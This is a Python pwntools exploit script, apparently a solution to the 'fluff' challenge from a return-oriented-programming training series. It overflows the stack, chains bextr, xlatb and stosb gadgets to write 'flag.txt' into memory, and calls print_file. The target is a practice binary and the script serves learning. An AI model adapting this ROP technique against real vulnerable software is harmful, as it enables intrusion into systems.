#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./fluff')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Determine rip offset --
def get_rip_offset(elf_path, n=100):
    # run binary and send pattern so that we can determine
    # rip offset
    io = process(elf_path)
    cyclic_pattern = cyclic_gen(string.ascii_uppercase, n=4)
    pattern = cyclic_pattern.get(n)
    io.sendlineafter('>', pattern)

    io.wait() # give it some time to get corefile

    # load corefile and read pattern from stack to get offset
    core = io.corefile
    stack = core.rsp
    rip_offset = cyclic_pattern.find(core.read(stack, 4))[0]
    debug('rip offset = %#x', rip_offset)
    return rip_offset

rip_offset = get_rip_offset(elf.path)

# -- Required Gadgets --
# 0x00000000004006a3: pop rdi; ret;
pop_rdi_ret = p64(0x4006a3)

"""
            0x0040062a      5a             pop rdx
            0x0040062b      59             pop rcx
            0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
            0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
            0x00400638      c3             ret
"""
bextr_ret = p64(0x40062a)

"""
            0x00400628      d7             xlatb
            0x00400629      c3             ret
"""
xlatb_ret = p64(0x400628)

"""
            0x00400639      aa             stosb byte [rdi], al
            0x0040063a      c3             ret
"""
stosb_ret = p64(0x400639)

# -- Exploit goes here --

io = start()

# address to write data to
write_addr = 0x601200

# explanation
# take control over rbx so that we can put addresses in that
# use xlatb instruction to get letters f, l, a, g, ., t, x, t from different memory locations
# and write them to write_addr using stosb by specifying address in rdi
# finally pass this address in rdi and call print_file

# address of letters in string flag.txt
rax_init_val = 0xb

f_addr = 0x4003dc + 6 - rax_init_val
l_addr = 0x4003dc + 8 - ord('f')
a_addr = 0x400415 + 3 - ord('l')
g_addr = 0x4003cd + 2 - ord('a')
dot_addr = 0x4003c1 + 8 - ord('g')
t_addr = 0x4003dc + 4 - ord('.')
x_addr = 0x4006c4 + 4 - ord('t')
t_addr2 = 0x4003dc + 4 - ord('x')

payload = flat(
    asm('nop') * rip_offset,

    # first we need control over rbx
    # we'll do this using bitextraction instruction
    # bit 0:7 of rdx will specify START of sequence of bits in rcx
    # bit 8:15 of rdx will give LENGTH of sequence of bits to extract
    # rcx will contain the data to be extracted to rbx
    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(f_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    # now use xlatb to single byte at address in rbx and store it in al
    xlatb_ret,
    # store add to write to in rdi
    pop_rdi_ret,
    p64(write_addr),
    # write this value to desired location using stosb
    stosb_ret,

    # then repeat the same process to construct whole string
    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(l_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(a_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(g_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(dot_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(t_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(x_addr - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    bextr_ret,
    p64(0x4000), # start at 0 and take all 64 bits
    p64(t_addr2 - 0x3ef2), # because 0x3ef2 be added by the instruction later
    xlatb_ret, # now use xlatb to single byte at address in rbx and store it in al
    stosb_ret, # write this value to desired location using stosb

    # finally call print file
    pop_rdi_ret,
    p64(write_addr),
    p64(elf.symbols.usefulFunction+9),
)

io.sendlineafter('>', payload)

io.interactive()
